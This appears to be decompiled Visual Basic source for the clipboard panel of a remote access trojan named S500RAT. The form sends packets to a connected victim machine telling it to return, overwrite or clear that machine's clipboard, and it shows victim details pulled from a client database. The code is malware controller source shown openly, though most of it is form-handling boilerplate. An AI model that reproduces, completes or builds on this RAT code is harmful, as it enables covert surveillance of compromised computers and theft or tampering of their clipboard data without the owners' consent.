Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.My
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x02000014 RID: 20
	<DesignerGenerated()>
	Public Partial Class FormClipboard
		Inherits Form

		' Token: 0x06000180 RID: 384 RVA: 0x0000C428 File Offset: 0x0000A628
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormCliboard_Load
			AddHandler MyBase.Resize, AddressOf Me.FormCliboard_Resize
			Me.FormSize = False
			Me.InitializeComponent()
		End Sub

		' Token: 0x170000B1 RID: 177
		' (get) Token: 0x06000183 RID: 387 RVA: 0x0000D284 File Offset: 0x0000B484
		' (set) Token: 0x06000184 RID: 388 RVA: 0x0000D290 File Offset: 0x0000B490
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x170000B2 RID: 178
		' (get) Token: 0x06000185 RID: 389 RVA: 0x0000D2D3 File Offset: 0x0000B4D3
		' (set) Token: 0x06000186 RID: 390 RVA: 0x0000D2DD File Offset: 0x0000B4DD
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x170000B3 RID: 179
		' (get) Token: 0x06000187 RID: 391 RVA: 0x0000D2E6 File Offset: 0x0000B4E6
		' (set) Token: 0x06000188 RID: 392 RVA: 0x0000D2F0 File Offset: 0x0000B4F0
		Private Overridable Property ClientInfo As Label

		' Token: 0x170000B4 RID: 180
		' (get) Token: 0x06000189 RID: 393 RVA: 0x0000D2F9 File Offset: 0x0000B4F9
		' (set) Token: 0x0600018A RID: 394 RVA: 0x0000D303 File Offset: 0x0000B503
		Public Overridable Property T1 As UIRichTextBox

		' Token: 0x170000B5 RID: 181
		' (get) Token: 0x0600018B RID: 395 RVA: 0x0000D30C File Offset: 0x0000B50C
		' (set) Token: 0x0600018C RID: 396 RVA: 0x0000D316 File Offset: 0x0000B516
		Friend Overridable Property Guna2ResizeBox1 As Guna2ResizeBox

		' Token: 0x170000B6 RID: 182
		' (get) Token: 0x0600018D RID: 397 RVA: 0x0000D31F File Offset: 0x0000B51F
		' (set) Token: 0x0600018E RID: 398 RVA: 0x0000D329 File Offset: 0x0000B529
		Private Overridable Property T1_ContextMenuStrip As ContextMenuStrip

		' Token: 0x170000B7 RID: 183
		' (get) Token: 0x0600018F RID: 399 RVA: 0x0000D332 File Offset: 0x0000B532
		' (set) Token: 0x06000190 RID: 400 RVA: 0x0000D33C File Offset: 0x0000B53C
		Friend Overridable Property RefreshToolStripMenuItem2 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RefreshToolStripMenuItem2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RefreshToolStripMenuItem2_Click
				Dim refreshToolStripMenuItem As ToolStripMenuItem = Me._RefreshToolStripMenuItem2
				If refreshToolStripMenuItem IsNot Nothing Then
					RemoveHandler refreshToolStripMenuItem.Click, value2
				End If
				Me._RefreshToolStripMenuItem2 = value
				refreshToolStripMenuItem = Me._RefreshToolStripMenuItem2
				If refreshToolStripMenuItem IsNot Nothing Then
					AddHandler refreshToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000B8 RID: 184
		' (get) Token: 0x06000191 RID: 401 RVA: 0x0000D37F File Offset: 0x0000B57F
		' (set) Token: 0x06000192 RID: 402 RVA: 0x0000D38C File Offset: 0x0000B58C
		Friend Overridable Property PasteToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._PasteToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.PasteToolStripMenuItem_Click
				Dim pasteToolStripMenuItem As ToolStripMenuItem = Me._PasteToolStripMenuItem
				If pasteToolStripMenuItem IsNot Nothing Then
					RemoveHandler pasteToolStripMenuItem.Click, value2
				End If
				Me._PasteToolStripMenuItem = value
				pasteToolStripMenuItem = Me._PasteToolStripMenuItem
				If pasteToolStripMenuItem IsNot Nothing Then
					AddHandler pasteToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000B9 RID: 185
		' (get) Token: 0x06000193 RID: 403 RVA: 0x0000D3CF File Offset: 0x0000B5CF
		' (set) Token: 0x06000194 RID: 404 RVA: 0x0000D3DC File Offset: 0x0000B5DC
		Friend Overridable Property CleanToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CleanToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CleanToolStripMenuItem_Click
				Dim cleanToolStripMenuItem As ToolStripMenuItem = Me._CleanToolStripMenuItem
				If cleanToolStripMenuItem IsNot Nothing Then
					RemoveHandler cleanToolStripMenuItem.Click, value2
				End If
				Me._CleanToolStripMenuItem = value
				cleanToolStripMenuItem = Me._CleanToolStripMenuItem
				If cleanToolStripMenuItem IsNot Nothing Then
					AddHandler cleanToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000BA RID: 186
		' (get) Token: 0x06000195 RID: 405 RVA: 0x0000D41F File Offset: 0x0000B61F
		' (set) Token: 0x06000196 RID: 406 RVA: 0x0000D42C File Offset: 0x0000B62C
		Friend Overridable Property Clean As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._Clean
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.Clean_Click
				Dim clean As Guna2GradientButton = Me._Clean
				If clean IsNot Nothing Then
					RemoveHandler clean.Click, value2
				End If
				Me._Clean = value
				clean = Me._Clean
				If clean IsNot Nothing Then
					AddHandler clean.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000BB RID: 187
		' (get) Token: 0x06000197 RID: 407 RVA: 0x0000D46F File Offset: 0x0000B66F
		' (set) Token: 0x06000198 RID: 408 RVA: 0x0000D47C File Offset: 0x0000B67C
		Friend Overridable Property Copy As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._Copy
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.Copy_Click
				Dim copy As Guna2GradientButton = Me._Copy
				If copy IsNot Nothing Then
					RemoveHandler copy.Click, value2
				End If
				Me._Copy = value
				copy = Me._Copy
				If copy IsNot Nothing Then
					AddHandler copy.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000BC RID: 188
		' (get) Token: 0x06000199 RID: 409 RVA: 0x0000D4BF File Offset: 0x0000B6BF
		' (set) Token: 0x0600019A RID: 410 RVA: 0x0000D4CC File Offset: 0x0000B6CC
		Friend Overridable Property Paste As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._Paste
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.Paste_Click
				Dim paste As Guna2GradientButton = Me._Paste
				If paste IsNot Nothing Then
					RemoveHandler paste.Click, value2
				End If
				Me._Paste = value
				paste = Me._Paste
				If paste IsNot Nothing Then
					AddHandler paste.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000BD RID: 189
		' (get) Token: 0x0600019B RID: 411 RVA: 0x0000D50F File Offset: 0x0000B70F
		' (set) Token: 0x0600019C RID: 412 RVA: 0x0000D519 File Offset: 0x0000B719
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x170000BE RID: 190
		' (get) Token: 0x0600019D RID: 413 RVA: 0x0000D522 File Offset: 0x0000B722
		' (set) Token: 0x0600019E RID: 414 RVA: 0x0000D52C File Offset: 0x0000B72C
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x170000BF RID: 191
		' (get) Token: 0x0600019F RID: 415 RVA: 0x0000D535 File Offset: 0x0000B735
		' (set) Token: 0x060001A0 RID: 416 RVA: 0x0000D53F File Offset: 0x0000B73F
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x170000C0 RID: 192
		' (get) Token: 0x060001A1 RID: 417 RVA: 0x0000D548 File Offset: 0x0000B748
		' (set) Token: 0x060001A2 RID: 418 RVA: 0x0000D552 File Offset: 0x0000B752
		Friend Overridable Property MAX As ValleyMax

		' Token: 0x170000C1 RID: 193
		' (get) Token: 0x060001A3 RID: 419 RVA: 0x0000D55B File Offset: 0x0000B75B
		' (set) Token: 0x060001A4 RID: 420 RVA: 0x0000D568 File Offset: 0x0000B768
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000C2 RID: 194
		' (get) Token: 0x060001A5 RID: 421 RVA: 0x0000D5AB File Offset: 0x0000B7AB
		' (set) Token: 0x060001A6 RID: 422 RVA: 0x0000D5B5 File Offset: 0x0000B7B5
		Public Property Client As Clients

		' Token: 0x170000C3 RID: 195
		' (get) Token: 0x060001A7 RID: 423 RVA: 0x0000D5BE File Offset: 0x0000B7BE
		' (set) Token: 0x060001A8 RID: 424 RVA: 0x0000D5C8 File Offset: 0x0000B7C8
		Public Property F As FormS500

		' Token: 0x170000C4 RID: 196
		' (get) Token: 0x060001A9 RID: 425 RVA: 0x0000D5D1 File Offset: 0x0000B7D1
		' (set) Token: 0x060001AA RID: 426 RVA: 0x0000D5DB File Offset: 0x0000B7DB
		Public Property FullPath As String

		' Token: 0x170000C5 RID: 197
		' (get) Token: 0x060001AB RID: 427 RVA: 0x0000D5E4 File Offset: 0x0000B7E4
		' (set) Token: 0x060001AC RID: 428 RVA: 0x0000D5EE File Offset: 0x0000B7EE
		Friend Property ParentClient As Clients

		' Token: 0x060001AD RID: 429 RVA: 0x0000D5F8 File Offset: 0x0000B7F8
		Private Sub FormCliboard_Load(sender As Object, e As EventArgs)
			Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
			Try
				Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(4) })
			Catch ex As Exception
				Me.ClientInfo.Text = "Not found !"
			End Try
			Me.FormSize = True
			Me.MinimumSize = MyBase.Size
		End Sub

		' Token: 0x060001AE RID: 430 RVA: 0x0000D6E0 File Offset: 0x0000B8E0
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.ParentClient.TcpClient.Connected OrElse Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x060001AF RID: 431 RVA: 0x0000D74C File Offset: 0x0000B94C
		Private Sub FormCliboard_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x060001B0 RID: 432 RVA: 0x0000D7E0 File Offset: 0x0000B9E0
		Private Sub Paste_Click(sender As Object, e As EventArgs)
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Packet").AsString = "Paste"
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
		End Sub

		' Token: 0x060001B1 RID: 433 RVA: 0x0000D828 File Offset: 0x0000BA28
		Private Sub Copy_Click(sender As Object, e As EventArgs)
			Try
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "Copy"
				msgPack.ForcePathObject("txt").AsString = Me.T1.Text
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060001B2 RID: 434 RVA: 0x0000D8AC File Offset: 0x0000BAAC
		Private Sub Clean_Click(sender As Object, e As EventArgs)
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Packet").AsString = "Claen"
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
		End Sub

		' Token: 0x060001B3 RID: 435 RVA: 0x0000D8F3 File Offset: 0x0000BAF3
		Private Sub RefreshToolStripMenuItem2_Click(sender As Object, e As EventArgs)
			MyProject.Computer.Clipboard.SetText(Me.T1.Text)
		End Sub

		' Token: 0x060001B4 RID: 436 RVA: 0x0000D911 File Offset: 0x0000BB11
		Private Sub PasteToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Me.T1.Text = MyProject.Computer.Clipboard.GetText()
		End Sub

		' Token: 0x060001B5 RID: 437 RVA: 0x0000D92F File Offset: 0x0000BB2F
		Private Sub CleanToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Me.T1.Text = Nothing
		End Sub

		' Token: 0x060001B6 RID: 438 RVA: 0x0000D93F File Offset: 0x0000BB3F
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
				MyBase.Close()
			End Sub)
		End Sub

		' Token: 0x040000C5 RID: 197
		Private FormSize As Boolean
	End Class
End Namespace
